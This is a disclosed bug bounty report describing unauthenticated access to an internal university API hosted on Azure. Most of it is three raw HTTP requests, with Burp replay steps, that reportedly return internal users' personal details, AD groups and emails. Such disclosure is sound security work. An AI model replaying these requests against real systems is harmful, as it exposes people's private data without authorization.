# Unauthenticated access to internal API at██████████.███.edu  [HtUS]

## Report Details
- **Report ID**: 1627980
- **URL**: https://hackerone.com/reports/1627980
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-07-06T14:02:28.184Z
- **Disclosed**: 2024-07-19T14:35:22.725Z

## Reporter
- **Username**: matrixsoftsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
#Overview:

* There are multiple API calls using which an attacker user is able to gain unauthenticated access to internal API████████.██████.edu via Azure API url appg3entcalapi.azurewebsites.net.  

* The access to█████.██████.edu is via microsoft and only allows internal users to access it.

* The appg3entcalapi.azurewebsites.net is listed as the API under the javascript located at [https://eventscalendar.████.edu/app.js](https://eventscalendar.██████.edu/app.js)

██████

#Steps to reproduce:

#(I) Vulnerable Request: Disclose PII of internal users-

```
GET /api/person/Default.GetAllPersons HTTP/1.1
Host: appg3entcalapi.azurewebsites.net
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 2

{}
```

* Copy the above vulnerable request to your BURP repeater tab and fire the request.

* Notice the 200 OK response disclosing the details.

██████████

#(II) Vulnerable Request: Disclose adgroups & internal emails-

```
GET /api/AdGroup HTTP/1.1
Host: appg3entcalapi.azurewebsites.net
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Content-Length: 2

{}
```

* Copy the above vulnerable request to your BURP repeater tab and fire the request.

* Notice the 200 OK response disclosing the details.

█████

#(III) Vulnerable Request:

```
GET /api/EventType HTTP/1.1
Host: appg3entcalapi.azurewebsites.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 2

{}
```

* Copy the above vulnerable request to your BURP repeater tab and fire the request.

* Notice the 200 OK response disclosing the details.

███████

## Impact

Unauthenticated access to internal API at████.████████.edu

## Attachments
No attachments
